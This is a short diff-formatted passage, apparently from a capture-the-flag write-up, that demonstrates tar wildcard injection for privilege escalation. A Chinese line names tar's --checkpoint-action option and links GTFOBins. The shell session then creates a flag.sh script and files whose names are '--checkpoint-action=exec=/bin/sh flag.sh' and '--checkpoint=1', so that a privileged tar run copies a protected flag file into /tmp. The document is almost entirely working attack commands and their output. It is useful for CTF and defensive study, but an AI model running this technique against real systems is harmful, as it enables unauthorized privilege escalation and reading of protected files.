@@ -1,0 +1,14 @@
+利用tar命令的--checkpoint-action参数，该参数可以执行shell命令。https://gtfobins.github.io/gtfobins/tar/
+bash-4.3$ echo 'cat /home/flag/flag_c6b0057b3d798b0.txt > /tmp/flag' > flag.sh
+bash-4.3$ echo "" > "--checkpoint-action=exec=/bin/sh flag.sh"
+bash-4.3$ echo "" > --checkpoint=1
+bash-4.3$ ls -al
+total 12
+-rw-r--r--    1 notroot  notroot          1 May 22 12:59 --checkpoint-action=exec=sh flag.sh
+-rw-r--r--    1 notroot  notroot          1 May 22 12:59 --checkpoint=1
+drwxr-sr-x    1 notroot  notroot         86 May 22 12:59 .
+drwxr-xr-x    1 root     root            33 Nov 16  2020 ..
+-rw-r--r--    1 notroot  notroot         52 May 22 12:58 flag.sh
+bash-4.3$ ls /tmp
+flag
+bash-4.3$ cat /tmp/flag
